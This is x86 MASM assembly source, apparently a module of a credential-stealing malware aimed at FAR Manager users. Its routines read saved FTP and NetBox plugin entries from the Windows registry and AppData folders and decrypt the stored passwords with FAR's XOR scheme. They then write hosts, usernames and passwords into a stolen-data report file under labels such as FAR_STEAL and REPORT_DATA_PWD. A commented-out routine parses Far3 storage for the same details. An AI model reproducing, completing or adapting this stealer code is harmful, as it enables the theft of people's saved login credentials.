      
      GetFAR        PROTO :DWORD, :DWORD
      
.data?
      FarBuf1       db  100h dup (?)
      FarBuf2       db  100h dup (?)
      FarBuf3       db  100h dup (?)
      FarPwd        db  1000h dup (?)
      FarHost       db  100h dup (?)
      FarUser       db  100h dup (?)
      FarAppData    db  200h dup (?)
      
.code

;get_actual_len proc
;      .if     ( eax >= 0 ) && ( eax <= 4 )
;              ; same size
;              jmp     shit
;      .elseif eax == 5
;              mov     eax, 6
;              jmp     shit
;      .elseif ( eax >= 6 ) && ( eax <= 7 )
;              mov     eax, 8
;              jmp     shit
;      .elseif ( eax >= 8 ) && ( eax <= 9 )
;              ; integer constants
;              xor     eax, eax
;              jmp     shit
;      .else
;              bt      eax, 0
;              jb      val_odd1
;                      sub     eax, 0Ch
;                      jmp     even_odd_shit_done1
;            val_odd1:
;                      sub     eax, 0Dh
;            even_odd_shit_done1:
;              shr     eax, 1
;      .endif
;    shit:
;      ret
;get_actual_len endp
;
;DecryptFar3 proc pMem:DWORD, dwSize:DWORD
;      LOCAL   local1, local3, cumul_len, hostnamelen, loginlen, pwdlen:DWORD
;      
;      mov     ebx, pMem
;      mov     eax, sizeof far3mark1
;      mov     local1, eax
;      mov     ecx, dwSize
;      sub     ecx, sizeof far3mark1
;      mov     local3, ecx
;      cmp     ecx, eax
;      jbe     far3_total_shit
;    far3_parse_lp:
;      mov     ecx, sizeof far3mark1
;      xor     edx, edx
;      mov     edi, offset far3mark1
;      lea     esi, dword ptr [ebx+eax]
;      cld
;      repe    cmpsb
;      jne     far3_skip_dunno
;      
;      lea     ecx, [ebx+eax]
;      ;mov     mark_start, ecx
;      .if     ( byte ptr [ecx-04h] == 01h ) && ( byte ptr [ecx-03h] == 29h )
;              movzx   eax, byte ptr [ecx-02h]
;              call    get_actual_len
;              add     ecx, sizeof far3mark1
;              add     ecx, eax
;              add     ecx, 4
;              .if     ( byte ptr [ecx+00h] == 01h ) && ( byte ptr [ecx+01h] == 2Dh )
;                      movzx   eax, byte ptr [ecx+02h]
;                      call    get_actual_len
;                      mov     hostnamelen, eax
;                      add     ecx, 14h
;                      pushad
;                      mov     byte ptr [FarHost], 01h
;                      RtlMoveMemory, addr FarHost+1, ecx, hostnamelen
;                      popad
;                      add     ecx, hostnamelen
;                      add     ecx, 4
;                      .if     ( byte ptr [ecx+00h] == 01h ) && ( byte ptr [ecx+01h] == 2Dh )
;                              movzx   eax, byte ptr [ecx+02h]
;                              call    get_actual_len
;                              mov     loginlen, eax
;                              add     ecx, 14h
;                              pushad
;                              mov     byte ptr [FarUser], 01h
;                              RtlMoveMemory, addr FarUser+1, ecx, loginlen
;                              popad
;                              add     ecx, loginlen
;                              add     ecx, 4
;                              ; skip 4 lines
;                              mov     edx, 4
;                            repeat_x4_skip:
;                              mov     cumul_len, 0
;                              movzx   eax, byte ptr [ecx]
;                              call    get_actual_len
;                              add     cumul_len, eax
;                              movzx   eax, byte ptr [ecx+01h]
;                              call    get_actual_len
;                              add     cumul_len, eax
;                              movzx   eax, byte ptr [ecx+02h]
;                              call    get_actual_len
;                              add     cumul_len, eax
;                              add     ecx, 3
;                              add     ecx, cumul_len
;                              add     ecx, 4
;                              dec     edx
;                              jnz     repeat_x4_skip
;                              ; pwd!
;                              add     ecx, 1
;                              .if     ( byte ptr [ecx+00h] == 01h ) && ( byte ptr [ecx+01h] == 2Dh )
;                                      add     ecx, 2
;                                      movzx   esi, byte ptr [ecx+00h]
;                                      movzx   edi, byte ptr [ecx+01h]
;                                      .if     esi > 7Fh
;                                              and     esi, 7Fh
;                                              shl     esi, 7
;                                              or      esi, edi
;                                              cmp     esi, 0Ch
;                                              jb      far3_data_too_much_over
;                                              sub     esi, 0Ch
;                                              shr     esi, 1
;                                            far3_data_too_much_over:
;                                              mov     pwdlen, esi
;                                              add     ecx, 10h
;                                              add     ecx, 3
;                                              pushad
;                                              mov     byte ptr [FarPwd], 01h
;                                              RtlMoveMemory, addr FarPwd+1, ecx, pwdlen
;                                              popad
;                                              pushad
;                                              
;                                              mov     eax, hostnamelen
;                                              inc     eax
;                                              mov     dword ptr [plen], eax
;                                              add     dword ptr [DataSize], sizeof plen
;                                              add     dword ptr [DataSize], eax
;                                              WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
;                                              mov     byte ptr [data_type], REPORT_DATA_HOST
;                                              add     dword ptr [DataSize], sizeof data_type
;                                              WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
;                                              WriteFile, stfile, addr FarHost, plen, addr SNW, NULL
;                                              
;                                              mov     eax, loginlen
;                                              inc     eax
;                                              mov     dword ptr [plen], eax
;                                              add     dword ptr [DataSize], sizeof plen
;                                              add     dword ptr [DataSize], eax
;                                              WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
;                                              mov     byte ptr [data_type], REPORT_DATA_LOGIN
;                                              add     dword ptr [DataSize], sizeof data_type
;                                              WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
;                                              WriteFile, stfile, addr FarUser, plen, addr SNW, NULL
;                                              
;                                              mov     eax, pwdlen
;                                              inc     eax
;                                              mov     dword ptr [plen], eax
;                                              add     dword ptr [DataSize], sizeof plen
;                                              add     dword ptr [DataSize], eax
;                                              WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
;                                              mov     byte ptr [data_type], REPORT_DATA_PWD
;                                              add     dword ptr [DataSize], sizeof data_type
;                                              WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
;                                              WriteFile, stfile, addr pwdlen, plen, addr SNW, NULL
;                                              
;                                              popad
;                                      .endif 
;                              .endif
;                      .endif
;              .endif
;      .endif
;      
;      mov     eax, local1
;    far3_skip_dunno:
;      inc     eax
;      mov     local1, eax
;      cmp     eax, local3
;      jb      far3_parse_lp
;      
;    far3_total_shit:
;      ret
;DecryptFar3 endp
;
FarRecCallback proc lpPath:DWORD, lpFilename:DWORD
      
      push    lpPath
      call    _PathFindFileName
      mov     byte ptr [eax], 0
      lstrcat, lpPath, lpFilename
      
      lstrcmp, lpFilename, addr far3_netbox_fn
      .if     eax != 0
              jmp     far_mapping_error
      .endif
      
      invoke  MapFile, lpPath, addr mfile, MAP_FILE_A
      .if     eax == 0
              jmp     far_mapping_error
      .endif
      
      add     dword ptr [DataSize], sizeof mfile.dwFileSize
      WriteFile, stfile, addr mfile.dwFileSize, sizeof mfile.dwFileSize, addr SNW, NULL
      mov     eax, dword ptr [mfile.dwFileSize]
      add     dword ptr [DataSize], eax
      mov     byte ptr [data_type], REPORT_DATA_BINARY
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, mfile.lpMem, mfile.dwFileSize, addr SNW, NULL
      
      invoke  UnmapFile, addr mfile
    far_mapping_error:
      
      ret
FarRecCallback endp

GetFARPwd proc
      LOCAL   WTF:DWORD
      mov     dword ptr [DataSize], 0
      mov     dword ptr [stbuf], FAR_STEAL
      WriteFile, stfile, addr stbuf, sizeof stbuf, addr SNW, NULL
      
      push    offset stealer_seh_proc
      assume  fs : nothing
      push    dword ptr fs:[0]
      mov     dword ptr fs:[0], esp
      mov     eax, offset GetFARPwd_seh
      mov     seh.SafeEip, eax
      mov     seh.PrevEbp, ebp
      mov     seh.PrevEsp, esp
      SetFilePointer, stfile, 0, 0, FILE_CURRENT
      mov     dword ptr [savedfilepointer], eax
      
      ; Far 1.75 - 1.8 - 2
      invoke  GetFAR, HKEY_CURRENT_USER, addr FarPath1
      invoke  GetFAR, HKEY_CURRENT_USER, addr FarPath2
      invoke  GetFAR, HKEY_CURRENT_USER, addr FarPath3
      invoke  GetFAR, HKEY_LOCAL_MACHINE, addr FarPath1
      invoke  GetFAR, HKEY_LOCAL_MACHINE, addr FarPath2
      invoke  GetFAR, HKEY_LOCAL_MACHINE, addr FarPath3
      ; Far 3 - SQLITE
      ; appdata shit #1
      push    0
      push    CSIDL_APPDATA
      push    offset FarAppData
      push    0
      call    dword ptr [_SHGetSpecialFolderPath]
      push    offset FarAppData
      call    dword ptr [_PathAddBackslash]
      lstrcat, addr FarAppData, addr Far3Path1
      mov     recursive_index, 0
      push    offset FarRecCallback
      push    offset FarAppData
      call    SomeRecursiveFunc
      ; appdata shit #2
      push    0
      push    CSIDL_COMMON_APPDATA
      push    offset FarAppData
      push    0
      call    dword ptr [_SHGetSpecialFolderPath]
      push    offset FarAppData
      call    dword ptr [_PathAddBackslash]
      lstrcat, addr FarAppData, addr Far3Path1
      mov     recursive_index, 0
      push    offset FarRecCallback
      push    offset FarAppData
      call    SomeRecursiveFunc
      ; appdata shit #3
      push    0
      push    CSIDL_LOCAL_APPDATA
      push    offset FarAppData
      push    0
      call    dword ptr [_SHGetSpecialFolderPath]
      push    offset FarAppData
      call    dword ptr [_PathAddBackslash]
      lstrcat, addr FarAppData, addr Far3Path1
      mov     recursive_index, 0
      push    offset FarRecCallback
      push    offset FarAppData
      call    SomeRecursiveFunc
      
    GetFARPwd_seh:
      pop     dword ptr fs:[0]
      add     esp, 4
      
      WriteFile, stfile, addr DataSize, sizeof DataSize, addr SNW, NULL
      mov     eax, dword ptr [DataSize] ; return actual size of written data
      ret
GetFARPwd endp

GetFAR proc hkey:DWORD, path:DWORD
      LOCAL   farKey :DWORD
      LOCAL   index :DWORD
      LOCAL   farbufsize :DWORD
      
      lea     eax, farKey
      push    eax
      push    KEY_READ
      push    0
      push    path
      push    hkey
      call    dword ptr [_RegOpenKeyEx]
      test    eax, eax
      jne     far_failed_1
      
      mov     dword ptr [index], 0
      
    far_enum_loop:
      RtlZeroMemory, addr FarBuf3, sizeof FarBuf3
      mov     farbufsize, sizeof FarBuf1
      xor     eax, eax
      push    eax
      push    eax
      push    eax
      push    eax
      lea     eax, farbufsize
      push    eax
      push    offset FarBuf1
      push    dword ptr [index]
      push    dword ptr [farKey]
      call    dword ptr [_RegEnumKeyEx]
      cmp     eax, ERROR_NO_MORE_ITEMS
      je      all_far_key_done
      inc     dword ptr [index]
      
      lstrcpy, addr FarBuf2, path
      lstrcat, addr FarBuf2, addr sl
      lstrcat, addr FarBuf2, addr FarBuf1
      
      ; Get Host
      mov     byte ptr [FarHost], 0
      invoke  RegRead, hkey, addr FarBuf2, addr FarReg2, addr FarHost, sizeof FarHost, REG_READ_A
      test    eax, eax
      je      far_failed_2
      OemToChar, addr FarHost, addr FarHost
      ; Get UserName
      mov     byte ptr [FarUser], 0
      invoke  RegRead, hkey, addr FarBuf2, addr FarReg4, addr FarUser, sizeof FarUser, REG_READ_A
      test    eax, eax
      je      far_failed_2
      OemToChar, addr FarUser, addr FarUser
      ; Get Pwd
      mov     byte ptr [FarPwd], 0
      invoke  RegRead, hkey, addr FarBuf2, addr FarReg3, addr FarPwd, sizeof FarPwd, REG_READ_A
      test    eax, eax
      je      far_failed_2
      ; Decrypt Pwd
      pushad
      mov     ebx, eax
      xor     ecx, ecx
      lea     esi, FarPwd
      movzx   eax, byte ptr [esi]
      mov     ah, byte ptr [esi+1]
      test    eax, eax
      je      far_failed_2
    far_find_end_pw_lp:
      lodsb
      test    al, al
      je      far_end_here
      inc     ecx
      cmp     ecx, ebx
      jne     far_find_end_pw_lp
    far_end_here:
      sub     ecx, 2
      lea     esi, FarPwd+2
      lea     edi, FarBuf3
      mov     dl, byte ptr [FarPwd]
      xor     dl, byte ptr [FarPwd+1]
      or      dl, 50h
    far_decrypt:
      lodsb
      xor     al, dl
      stosb
      dec     ecx
      jnz     far_decrypt
      popad
      OemToChar, addr FarBuf3, addr FarBuf3
      
      lstrlen, addr FarHost
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_HOST
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr FarHost, plen, addr SNW, NULL
      
      lstrlen, addr FarUser
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_LOGIN
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr FarUser, plen, addr SNW, NULL
      
      lstrlen, addr FarBuf3
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_PWD
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr FarBuf3, plen, addr SNW, NULL
      
    far_failed_2:
      jmp     far_enum_loop
      
    all_far_key_done:
      push    dword ptr [farKey]
      call    dword ptr [_RegCloseKey]
    far_failed_1:
      ret
GetFAR endp
